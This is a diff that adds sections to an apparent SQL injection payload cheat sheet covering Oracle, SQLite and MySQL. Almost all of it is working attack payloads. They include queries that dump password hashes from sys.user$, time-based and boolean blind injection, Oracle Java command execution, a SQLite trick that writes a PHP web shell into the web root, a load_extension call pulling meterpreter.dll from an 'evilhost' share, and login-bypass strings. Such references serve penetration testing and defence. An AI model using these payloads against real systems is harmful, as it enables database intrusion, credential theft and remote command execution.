@@ -2370,6 +2370,204 @@ x' or 1=1 or 'x'='y
 â or 3=3 --
 ```
 
+# Oracle SQL Injection
+## Oracle SQL Default Databases
+Name	Description
+SYSTEM	Available in all versions
+SYSAUX	Available in all versions
+
+## Oracle SQL Comments
+
+| Type  | Description |
+| ------------- | ------------- |
+| -- -  | SQL comment  |
+
+
+## Oracle SQL Version
+```sql
+SELECT user FROM dual UNION SELECT * FROM v$version
+SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
+SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
+SELECT version FROM v$instance;
+```
+
+## Oracle SQL Hostname
+```sql
+SELECT host_name FROM v$instance; (Privileged)
+SELECT UTL_INADDR.get_host_name FROM dual;
+SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
+SELECT UTL_INADDR.get_host_address FROM dual;
+```
+
+## Oracle SQL Database Name
+```sql
+SELECT global_name FROM global_name;
+SELECT name FROM V$DATABASE;
+SELECT instance_name FROM V$INSTANCE;
+SELECT SYS.DATABASE_NAME FROM DUAL;
+```
+
+## Oracle SQL Database Credentials
+| Query  | Description |
+| ------------- | ------------- |
+| SELECT username FROM all_users;	  | Available on all versions  |
+| SELECT name, password from sys.user$;	  | Privileged, <= 10g  |
+| SELECT name, spare4 from sys.user$;	  | Privileged, <= 11g  |
+
+
+## Oracle SQL List Databases
+```sql
+SELECT DISTINCT owner FROM all_tables;
+```
+
+## Oracle SQL List Columns
+```sql
+SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
+SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
+```
+
+## Oracle SQL List Tables
+```sql
+SELECT table_name FROM all_tables;
+SELECT owner, table_name FROM all_tables;
+SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
+```
+
+## Oracle SQL Time based
+```sql
+AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
+```
+
+## Oracle Java Execution
+* List Java privileges
+```sql
+select * from dba_java_policy
+select * from user_java_policy
+```
+* Grant privileges
+```sql
+exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
+exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
+exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
+```
+* Execute commands
+  * 10g R2, 11g R1 and R2: `DBMS_JAVA_TEST.FUNCALL()`
+```sql
+SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
+SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
+```
+
+ * 11g R1 and R2: `DBMS_JAVA.RUNJAVA()`
+```sql
+SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
+```
+
+# SQLite Injection
+```bash
+# SQLite comments
+--
+/**/
+
+# SQLite version
+select sqlite_version();
+
+# String based - Extract database structure
+SELECT sql FROM sqlite_schema
+
+# Integer/String based - Extract table name
+SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+
+# Integer/String based - Extract column name
+SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
+
+ # For a clean output
+SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
+
+ # Cleaner output
+SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');
+
+# Boolean - Count number of tables
+and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
+
+# Boolean - Enumerating table name
+and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
+
+# Boolean - Extract info
+and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
+
+# Boolean - Extract info (order by)
+CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN <order_element_1> ELSE <order_element_2> END
+
+# Boolean - Error based
+AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
+
+# Time based
+AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+
+# Remote Command Execution using SQLite command - Attach Database
+ATTACH DATABASE '/var/www/lol.php' AS lol;
+CREATE TABLE lol.pwn (dataz text);
+INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
+
+# Remote Command Execution using SQLite command - Load_extension (Note: By default this component is disabled)
+UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
+```
+
+# MYSQL
+## MYSQL Default Databases
+| Name  | Description |
+| ------------- | ------------- |
+| mysql	 | Requires root privileges  |
+| information_schema	 | Availalble from version 5 and higher  |
+
+## MYSQL Testing Injection
+* Strings: Query like `SELECT * FROM Table WHERE id = 'FUZZ';`
+```mysql
+'	False
+''	True
+"	False
+""	True
+\	False
+\\	True
+```
+
+* Numeric: Query like SELECT * FROM Table WHERE id = FUZZ;
+```mysql
+AND 1	    True
+AND 0	    False
+AND true	True
+AND false	False
+1-false	    Returns 1 if vulnerable
+1-true	    Returns 0 if vulnerable
+1*56	    Returns 56 if vulnerable
+1*56	    Returns 1 if not vulnerable
+```
+
+* Login: Query like SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';
+```mysql
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+'='
+'LIKE'
+'=0--+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
